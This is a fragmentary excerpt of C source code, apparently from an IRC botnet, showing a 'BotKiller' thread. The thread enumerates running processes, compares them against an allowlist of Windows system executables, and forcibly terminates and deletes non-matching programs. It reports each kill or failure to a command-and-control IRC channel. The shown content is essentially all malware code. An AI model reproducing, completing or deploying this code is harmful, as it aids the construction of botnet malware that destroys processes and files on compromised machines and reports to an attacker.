...
char	cfg_bkchan[] = "#abc123";

// not encoded strings
static char string_done[] = "Bot killed and removed:";
static char string_nodel[] = "Can not delete:";
static char string_noterm[] = "Error terminating:";
...
"ssmarque.scr", "ssmypics.scr", "ssmyst.scr", "sspipes.scr", "ssstars.scr", "sstext3d.scr", "System" };
...
"ST6UNST.EXE", "TASKMAN.EXE", "twunk_16.exe", "twunk_32.exe", "winhelp.exe", "winhlp32.exe", "System" };
...
DWORD WINAPI BotKillerThread(LPVOID param) 
{
	...
	if (bk.ScanDelay == 0)
		bk.ScanDelay = 60;
_snprintf(fname12, sizeof(fname12) - 1, "%s", Decode(cfg_filename));
			...
			if ((hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0)) != INVALID_HANDLE_VALUE) {
				...
				if (Process32First(hProcess, &pe32)) {
					while (Process32Next(hProcess, &pe32)) {
						...
						if (lstrcmpi(pe32.szExeFile, fname12) != 0) {
							//sysdir						
								...
								if (SysMatch == 0) {  //if there are no matches, start thread to terminate and delete the bot
									if (hProcess2=OpenProcess(PROCESS_ALL_ACCESS,FALSE,pe32.th32ProcessID)) {
										if (!TerminateProcess(hProcess2,0)) {
											_snprintf(Buffer, sizeof(Buffer), "%s %s (pid: %d)!", 
												string_noterm, pe32.szExeFile, pe32.th32ProcessID);
											IRC_Send(bk.Sock, MSG_PRIVMSG, Buffer, cfg_bkchan);
											...
											if (success_delete) 
												_snprintf(Buffer, sizeof(Buffer), "%s %s (pid: %d)!", 
													string_done, FileToDelete, pe32.th32ProcessID);
											else 
												_snprintf(Buffer, sizeof(Buffer), "%s %s (pid: %d)!", 
													string_nodel, FileToDelete, pe32.th32ProcessID);
